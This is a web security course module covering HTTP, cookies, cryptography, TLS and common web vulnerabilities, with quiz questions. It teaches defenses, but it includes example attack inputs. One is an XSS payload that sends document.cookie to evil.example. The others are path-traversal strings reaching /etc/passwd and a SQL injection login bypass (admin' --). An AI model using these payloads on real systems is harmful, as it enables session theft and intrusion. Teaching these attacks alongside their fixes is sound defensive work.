The web, cryptography and security

This week builds on networking: first how the web actually works at the HTTP level, then the cryptography that makes it safe to use, and then the mistakes that make web applications unsafe anyway. In the project you'll attack a deliberately vulnerable app, then fix every hole you found. Seeing an attack work is the fastest way to understand why the defenses look the way they do.

By the end of this week you can

  • Read and write raw HTTP requests and responses, including caching and cookies
  • Explain the same-origin policy, CORS, and cookie security attributes
  • Choose correctly between hashing, MACs, encryption and encoding, and store passwords safely
  • Explain public-key cryptography, key exchange, certificates and the TLS handshake
  • Find and fix SQL injection, XSS, CSRF, path traversal and broken access control
  • Design authentication and sessions securely, and reason about threats

Lesson 6.1 · 45 min

HTTP in depth

HTTP is a text-based request–response protocol that runs over TCP (or QUIC for HTTP/3). The client sends a request, the server sends one response, and that's the whole conversation. Here's what's actually on the wire:

POST /api/orders HTTP/1.1                   ← method, path, version
Host: shop.example.com                      ← headers: "Name: value"
Content-Type: application/json
Content-Length: 27
Cookie: session=8f2a91c4e7
                                            ← blank line ends the headers
{"item": "book", "qty": 2}                  ← optional body

HTTP/1.1 201 Created                        ← version, status code, reason
Content-Type: application/json
Location: /api/orders/1042
Cache-Control: no-store

{"id": 1042, "status": "pending"}

You can see this yourself with curl -v https://example.com, or in the Network tab of your browser's developer tools.

Methods

  • GET fetches a resource. It must be safe (no side effects), which lets browsers, proxies and crawlers repeat or prefetch it freely.
  • POST submits data or creates something. Not safe, and not idempotent: sending it twice may create two orders.
  • PUT replaces a resource and DELETE removes one. Both are idempotent: doing them twice has the same effect as once, so they're safe to retry.
  • PATCH partially updates a resource.

Status codes

ClassMeaningOnes to know
2xxSuccess200 OK, 201 Created, 204 No Content
3xxGo elsewhere301 Moved Permanently, 302 / 303 redirect, 304 Not Modified
4xxThe client did something wrong400 Bad Request, 401 not authenticated, 403 Forbidden, 404 Not Found, 409 Conflict, 429 Too Many Requests
5xxThe server failed500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout

The 4xx/5xx split matters operationally: alerts usually fire on 5xx rates, because those are your bugs. A 502 or 504 usually comes from a proxy or load balancer in front of your app, telling you the app behind it didn't answer properly.

State, cookies and caching

HTTP is stateless: each request stands alone. To remember a logged-in user, the server sends Set-Cookie: session=…, and the browser returns it in a Cookie header with every later request to that site. Lesson 6.2 covers how to do that safely.

Caching headers tell browsers and CDNs what they may reuse. Cache-Control: max-age=3600 means "reuse this for an hour without asking". An ETag lets a client ask "has this changed?" and get a tiny 304 Not Modified instead of the full body. Cache-Control: no-store is for anything private, like account pages.

HTTP/1.1, 2 and 3

HTTP/1.1 sends one request at a time per connection, so browsers open several connections. HTTP/2 multiplexes many requests over one TCP connection, using binary framing and compressed headers. HTTP/3 runs over QUIC on UDP, which removes TCP's head-of-line blocking (week 5) and sets up encryption faster. The methods, status codes and headers are the same in all three; only the transport changed.

A "Delete account" link is implemented as GET /account/delete. Why is that a bad idea?

  1. GET requests can't carry cookies
  2. GET requests are slower
  3. GET is supposed to be safe, so browsers, link previews and crawlers may request it automatically, and an attacker's page can trigger it with a simple image tag
  4. DELETE is the only method that can delete things
Anything that changes state should be POST (or DELETE, PUT, PATCH) and protected against CSRF (lesson 6.5). Link-preview bots have deleted real data this way.

Your monitoring shows a spike in 502 Bad Gateway errors. Where should you look first?

  1. The users' browsers
  2. The application servers behind the load balancer or proxy, which are crashing, refusing connections or returning invalid responses
  3. DNS
  4. Nowhere; 502s are normal
A 502 is generated by the proxy, reporting that the upstream server failed it. The proxy itself is usually fine.

Lesson 6.2 · 40 min

Browsers, origins and cookies

The same-origin policy

Your browser runs code from many websites at once, in tabs, iframes and scripts. The same-origin policy keeps them apart. An origin is the combination of scheme, host and port: https://bank.com:443. A page can freely read data from its own origin, but JavaScript on evil.com cannot read the responses of requests it makes to bank.com, and cannot read bank.com's pages or storage.

Compared with https://app.example.comSame origin?
https://app.example.com/settingsYes (only the path differs)
http://app.example.comNo (different scheme)
https://api.example.comNo (different host)
https://app.example.com:8443No (different port)

Note what the policy does not stop: a page can still send requests to other origins (submit forms, load images and scripts). It just can't read the responses. That gap is exactly what CSRF attacks exploit (lesson 6.5).

CORS

Sometimes you want cross-origin reads, such as your front end at app.example.com calling your API at api.example.com. CORS (cross-origin resource sharing) lets the API opt in: it responds with Access-Control-Allow-Origin: https://app.example.com, and the browser lets that page read the response. For non-simple requests (custom headers, JSON bodies, PUT or DELETE), the browser first sends an OPTIONS preflight request to ask permission. CORS is enforced by browsers only. It doesn't stop curl or another server calling your API, so it's not an access control mechanism. Never reflect any origin back combined with Allow-Credentials: true; that lets every site read your users' data.

Sessions and cookie attributes

After login, the server creates a session: a long random ID stored server-side alongside the user's identity, and sent to the browser as a cookie. The ID is the user's credential for as long as it's valid, so the cookie needs protecting:

Set-Cookie: session=Qm9vLXlhaC1yYW5kb20tMzItYnl0ZXM; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
  • HttpOnly: JavaScript can't read it, so an XSS bug can't simply steal it.
  • Secure: only sent over HTTPS, never in plain text.
  • SameSite=Lax (or Strict): not sent on most cross-site requests, which blocks most CSRF. Lax is the default in modern browsers.
  • Max-Age or Expires: limit how long it lives. Without one, it's a session cookie that lasts until the browser closes.

The alternative is a token such as a JWT: a signed blob containing the user ID and expiry, which the server can verify without a database lookup. The payload is readable by anyone (it's only Base64-encoded), so never put secrets in it, and a signed token can't easily be revoked before it expires. Storing tokens in localStorage makes them readable by any script on the page, which is why HttpOnly cookies are generally the safer place for browser sessions.

A page on https://shop.example.com calls fetch("https://shop.example.com:8443/api/cart"). Is that a cross-origin request?

  1. No, the host is the same
  2. No, both use HTTPS
  3. Only if cookies are sent
  4. Yes, because the port is different (443 vs 8443)
Scheme, host and port must all match. The API would need to send CORS headers for the page to read the response.

Which cookie attribute stops a successful XSS attack from reading the session ID with document.cookie?

  1. HttpOnly
  2. Secure
  3. SameSite
  4. Path
HttpOnly hides the cookie from scripts. (The injected script can still act as the user while the page is open, so preventing XSS still matters.)

Cryptography building blocks

Most security mistakes with cryptography come from using the wrong tool, not from broken algorithms. Four tools are easy to confuse:

ToolKey?Reversible?Use it forExamples
EncodingNoYes, by anyoneRepresenting bytes as text. Provides no security at all.Base64, hex, URL encoding
HashingNoNoFingerprints, integrity checks, (slow, salted) password storageSHA-256, SHA-3; bcrypt, scrypt, Argon2, PBKDF2 for passwords
MACYes (shared secret)NoProving a message came from someone with the key and wasn't alteredHMAC-SHA256
EncryptionYesYes, with the keyKeeping data secretAES-GCM, ChaCha20-Poly1305; RSA, elliptic curves

Cryptographic hashes

A cryptographic hash function turns any input into a fixed-size digest (256 bits for SHA-256) with three key properties: you can't work backwards from a digest to the input (preimage resistance), you can't find two inputs with the same digest (collision resistance), and any change to the input completely changes the output (the avalanche effect).

MD5 and SHA-1 are broken for collision resistance, and practical collisions have been demonstrated. Don't use them for anything security-related.

Storing passwords

You should never be able to recover a user's password, so store a hash. But a fast hash like SHA-256 is the wrong choice: attackers with a stolen database and a GPU can try billions of guesses per second. Use a deliberately slow password hashing function (Argon2id, scrypt, bcrypt, or PBKDF2 with hundreds of thousands of iterations) together with a random per-user salt:

import hashlib, hmac, secrets

def hash_password(password: str) -> str:
    salt = secrets.token_bytes(16)                              # unique per user
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000)
    return f"pbkdf2_sha256$600000${salt.hex()}${digest.hex()}"

def verify_password(password: str, stored: str) -> bool:
    _, iterations, salt_hex, digest_hex = stored.split("$")
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt_hex), int(iterations))
    return hmac.compare_digest(digest.hex(), digest_hex)        # constant-time comparison

The salt makes identical passwords hash differently and defeats precomputed lookup tables (rainbow tables). Storing the algorithm and iteration count with the hash lets you strengthen them later. hmac.compare_digest takes the same time whether the first byte or the last byte differs, so attackers can't learn anything from response timings.

Symmetric encryption and MACs

Symmetric ciphers use the same key to encrypt and decrypt. AES is the standard, and it's hardware-accelerated in most CPUs. Always use an authenticated encryption mode such as AES-GCM or ChaCha20-Poly1305: it detects any tampering with the ciphertext, not just keeps it secret. Never reuse a nonce with the same key, and never design your own scheme; use a well-reviewed library.

An HMAC is a keyed hash. Anyone with the key can compute HMAC(key, message), and without the key it's infeasible to produce a valid one. It's how servers sign session cookies, API webhooks and JWTs, so they can detect any change.

Randomness

Keys, session IDs, password reset tokens and salts must come from a cryptographically secure random number generator. In Python that's the secrets module. The random module is predictable: given a few outputs, an attacker can work out the next ones.

A developer stores passwords as sha256(password). What's the most important problem?

  1. SHA-256 is reversible
  2. It's fast and unsalted: identical passwords produce identical hashes, and attackers can test billions of guesses per second against a stolen database
  3. SHA-256 outputs are too long to store
  4. Nothing; SHA-256 is secure
SHA-256 is fine for integrity, but terrible for passwords. Use a slow, salted algorithm designed for passwords.

An API sends webhooks to your server. How can you check that a webhook really came from the API provider and wasn't modified?

  1. Check that the request body is valid JSON
  2. Base64-decode the body
  3. The provider includes an HMAC of the body computed with a secret you share; you recompute it and compare with hmac.compare_digest
  4. Check the User-Agent header
Only someone with the shared secret can produce a valid HMAC, and any change to the body changes it. Headers like User-Agent can be set to anything.

Lesson 6.4 · 50 min

Public keys, certificates and TLS

Symmetric encryption has a chicken-and-egg problem: you need a shared secret key, but how do you share it with a website you've never visited, over a network anyone can watch? Public-key cryptography solves it.

Public and private keys

In public-key (asymmetric) cryptography, each party has a key pair. The public key can be shared with the world; the private key never leaves its owner. They do two different jobs:

  • Encryption: anyone encrypts with your public key, and only your private key decrypts.
  • Signatures: you sign with your private key, and anyone verifies with your public key. A valid signature proves the message came from the key's owner and wasn't changed.

Public-key operations are slow, so real systems use them only to authenticate and to agree on a symmetric key, then switch to fast symmetric encryption for the actual data. That's hybrid encryption.

Key exchange

Diffie–Hellman lets two parties agree on a shared secret over a public channel, without ever sending the secret. Each picks a private number, sends a public value derived from it, and combines the other side's public value with their own private number. Both arrive at the same result, but an eavesdropper who saw everything can't compute it, because doing so means solving the discrete logarithm problem, which is infeasible for large numbers.

Diffie–Hellman alone has a weakness: it proves nothing about who you agreed a key with. An attacker in the middle could run one exchange with you and another with the server. Signatures and certificates close that hole.

Certificates

A certificate binds a domain name to a public key, and is signed by a certificate authority (CA). Your OS and browser ship with a list of trusted root CAs. When a site presents its certificate, the browser checks:

  • the certificate is for this exact domain name
  • it's within its validity dates and hasn't been revoked
  • its signature chain leads (usually through an intermediate CA) to a trusted root

Let's Encrypt issues free certificates automatically by checking that you control the domain, which is why nearly the whole web now uses HTTPS. Certificate Transparency logs publicly record every certificate issued, so a mistakenly issued one for your domain can be spotted.

The TLS 1.3 handshake

  1. Client hello: the client sends the TLS versions and cipher suites it supports, plus its key-exchange share (an ephemeral Diffie–Hellman public value).
  2. Server hello: the server picks a cipher suite, sends its own key-exchange share, and both sides now compute the same shared secret. Everything after this is encrypted.
  3. The server sends its certificate and a signature over the handshake made with its private key, proving it owns the certificate's key and that nobody tampered with the exchange.
  4. The client verifies the certificate chain and signature. Both sides derive symmetric session keys, and encrypted HTTP traffic begins. All of this takes one round trip.

Because the Diffie–Hellman values are ephemeral (thrown away after each connection), TLS 1.3 has forward secrecy: even if the server's private key is stolen later, recorded past traffic can't be decrypted.

What HTTPS does and doesn't protect

HTTPS gives confidentiality (nobody on the path can read the traffic), integrity (nobody can change it unnoticed) and server authentication (you're talking to whoever controls that domain). It does not make the site trustworthy (phishing sites have valid certificates), it doesn't hide which site you're visiting from your network (the domain name and IP address are visible), and it does nothing about vulnerabilities in the application itself.

Why does TLS use public-key cryptography only during the handshake, then switch to AES or ChaCha20?

  1. Public-key encryption is less secure
  2. Browsers don't support public keys after the handshake
  3. Symmetric keys never expire
  4. Public-key operations are far slower; they're used to authenticate and agree on a key, and fast symmetric encryption handles the data
Hybrid encryption: each tool does what it's good at.

In the Diffie–Hellman widget, Eve sees p, g, A and B. Why can't she compute the shared secret with realistic key sizes?

  1. The values are encrypted
  2. She'd need a or b, and recovering one from A = gᵃ mod p (the discrete logarithm) is computationally infeasible for large p
  3. The shared secret is sent over a different channel
  4. She can compute it easily; Diffie–Hellman is insecure
Computing gᵃ mod p is fast; reversing it is infeasible at 2048 bits or with elliptic curves. Authentication (certificates and signatures) is still needed to stop a man-in-the-middle.

Lesson 6.5 · 55 min

Web vulnerabilities

Most serious web vulnerabilities come from one root cause: untrusted input being treated as code or as authority. Everything a request contains (form fields, URLs, headers, cookies, uploaded files) is controlled by whoever sent it. The OWASP Top 10 is the standard list of the most common risks; these are the ones you'll exploit and fix in the project.

SQL injection

When user input is pasted into an SQL string, a quote character in the input ends the string early and everything after it becomes SQL. Try it:

The fix is parameterized queries: send the SQL and the values separately, so the database never parses input as SQL.

# Vulnerable
db.execute(f"SELECT * FROM users WHERE username = '{username}'")
# Safe: the ? placeholder is filled in by the database driver
db.execute("SELECT * FROM users WHERE username = ?", (username,))

Escaping by hand is fragile; parameters are the real fix. ORMs use them for you, until someone writes raw SQL with string formatting. The same class of bug appears wherever input is spliced into an interpreter: shell commands (command injection: use subprocess.run([...]) with a list, never shell=True with user input), LDAP queries, templates.

Cross-site scripting (XSS)

XSS is injection into HTML. If a page inserts a user's comment as raw HTML, a comment like <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"> becomes live code running on your origin, in every visitor's browser, with full access to the page and the user's session. Stored XSS is saved on the server (comments, profiles); reflected XSS bounces off a URL parameter; DOM-based XSS happens entirely in front-end JavaScript (element.innerHTML = location.hash).

Defenses, in order of importance:

  • Escape output for its context. In HTML, turn < > & " ' into entities (html.escape in Python). Template engines like Jinja2 and frameworks like React do this by default; the danger is in the escape hatches (|safe, dangerouslySetInnerHTML, innerHTML).
  • In JavaScript, set text with textContent, not innerHTML.
  • Add a Content-Security-Policy header that forbids inline scripts, so injected code doesn't run even if escaping is missed somewhere.
  • HttpOnly cookies limit the damage.

Cross-site request forgery (CSRF)

You're logged into your bank. You visit a malicious page containing a hidden form that auto-submits to https://bank.example/transfer. Your browser attaches your bank cookie, because cookies are sent with requests to their site no matter which page triggered them, and the bank sees a legitimate, authenticated request. The attacker can't read the response (same-origin policy), but they don't need to: the money has moved.

Defenses: SameSite cookies stop the cookie being sent on cross-site POSTs. A CSRF token (a random value tied to the session, embedded in your own forms and checked on every state-changing request) proves the request came from your page, since the attacker's page can't read it. And never change state on GET.

Path traversal

A download endpoint that does open("files/" + request.args["name"]) will happily open files/../../etc/passwd, or on Windows files\..\..\secrets.env. Resolve the full path and check it's still inside the intended directory, or better, don't take paths from users at all: look files up by an ID in your database.

Broken access control

Consistently near the top of the OWASP list. Being logged in isn't the same as being allowed: if GET /invoices/1042 returns any invoice to any logged-in user, changing the number in the URL exposes other customers' invoices (an IDOR, insecure direct object reference). Check on the server, on every request, that this user may access this object. Hiding a button in the UI is not access control. A related bug is trusting client-supplied values the server should decide itself: prices, user IDs, roles, or a transfer amount of −100.

A login query is built as "... WHERE username = '" + u + "' AND password_hash = '" + h + "'". An attacker enters admin' -- as the username. What happens?

  1. Login fails because the username doesn't exist
  2. The database returns an error and nothing else
  3. The quote closes the string and -- comments out the password check, so they're logged in as admin
  4. The input is automatically escaped
The query becomes WHERE username = 'admin' --' AND ..., and everything after -- is ignored. Parameterized queries make this impossible.

Why don't CORS rules or the same-origin policy prevent CSRF?

  1. They stop a page reading cross-origin responses, but not sending requests, and a CSRF attack only needs the request to be sent (with the victim's cookies)
  2. CSRF only uses GET requests
  3. CSRF attacks come from the server, not the browser
  4. They do prevent it completely
That's why CSRF needs its own defenses: SameSite cookies and anti-CSRF tokens.

A comments page uses Jinja2 templates, which escape output by default. Where would an XSS bug most likely come from?

  1. The database
  2. Using HTTPS
  3. Long comments
  4. A place where escaping was deliberately bypassed, such as {{ comment | safe }}, or front-end code that inserts the comment with innerHTML
Safe defaults move the risk to escape hatches. Search code reviews for |safe, Markup(, innerHTML and dangerouslySetInnerHTML.

Logged-in users can view their orders at /orders/5531. One user changes the URL to /orders/5530 and sees someone else's order. What kind of vulnerability is this?

  1. SQL injection
  2. Broken access control (an IDOR): the server checks that the user is logged in, but not that the order belongs to them
  3. XSS
  4. A TLS problem
Check ownership on the server for every object access. Random IDs make guessing harder but are not a substitute for the check.

Lesson 6.6 · 40 min

Authentication and secure design

Authentication done properly

Authentication establishes who someone is; authorization decides what they may do. For authentication:

  • Store passwords with a slow, salted hash (lesson 6.3). Allow long passwords and check new ones against lists of known-breached passwords, rather than imposing composition rules.
  • Offer multi-factor authentication. Authenticator apps are good; hardware keys and passkeys are better, because they're bound to the real site's origin, so a phishing site can't capture and replay them. SMS codes are the weakest option.
  • Rate-limit login attempts per account and per IP to slow down guessing and credential stuffing.
  • Give the same error for "no such user" and "wrong password", so attackers can't discover which accounts exist.

Sessions

  • Generate session IDs with a secure random generator (secrets.token_urlsafe(32)). Never derive them from the username or a counter.
  • Issue a new session ID at login (stops session fixation), and delete it on the server at logout.
  • Expire sessions after inactivity, and require re-authentication for sensitive actions like changing a password or email.
  • Set HttpOnly, Secure and SameSite on the cookie.

Principles that prevent whole classes of bugs

  • Never trust the client. Validate and authorize everything on the server, every time.
  • Least privilege. The web app's database user shouldn't be able to drop tables; a service shouldn't run as root; an API key should only have the permissions its job needs.
  • Defense in depth. Layer protections (parameterized queries and a least-privilege database user; output escaping and a Content-Security-Policy) so one mistake isn't fatal.
  • Secure defaults. Prefer frameworks and settings where the safe behavior happens automatically and the unsafe one needs an explicit opt-out.
  • Keep secrets out of code. Use environment variables or a secret manager, never commit them to git (history keeps them forever), and rotate any secret that leaks.
  • Keep dependencies updated, and use tools that alert you to known vulnerabilities in them.
  • Log security events (logins, permission failures, password changes) without logging secrets like passwords or tokens.

Threat modeling

Before building a feature, spend ten minutes asking four questions: What are we building? What can go wrong? What are we going to do about it? Did we do a good job? The STRIDE checklist helps with the second: Spoofing identity, Tampering with data, Repudiation (denying an action), Information disclosure, Denial of service, Elevation of privilege. A password reset feature, for example, has obvious spoofing risks (can someone reset another user's password?), information disclosure risks (does the response reveal whether an email is registered?) and denial-of-service risks (can someone flood a user with reset emails?).

After a successful login, an app keeps using the session ID the browser already had before logging in. Why is that risky?

  1. Session IDs must change every request
  2. It makes login slower
  3. An attacker who planted or knew the pre-login session ID (session fixation) is now logged in as the user too; a fresh ID at login prevents this
  4. It isn't risky
Always issue a new session identifier when privilege changes, especially at login.

Why are passkeys and hardware security keys resistant to phishing, while authenticator-app codes aren't?

  1. The browser binds the key's response to the real site's origin, so a look-alike phishing domain gets nothing it can replay; a 6-digit code can be typed into a fake site and relayed in real time
  2. Passkeys are longer than codes
  3. Hardware keys can't be lost
  4. Authenticator codes are sent over SMS
Origin binding is the key property. That's why security teams increasingly push for passkeys or hardware keys for sensitive accounts.

Week 6 in one paragraph

HTTP is stateless text over TCP: methods with clear semantics, status codes that tell you who failed, cookies for state and headers for caching. Browsers isolate origins, and CORS lets servers relax that for reads. Encoding isn't security; hashes fingerprint, HMACs authenticate, authenticated encryption keeps secrets, and passwords need slow salted hashes. Public keys and Diffie–Hellman bootstrap TLS, certificates prove who's on the other end, and ephemeral keys give forward secrecy. Most web vulnerabilities come from treating untrusted input as code or authority, so use parameterized queries, escape output, check CSRF tokens, contain file paths and authorize every request. Then build defense in depth on top.
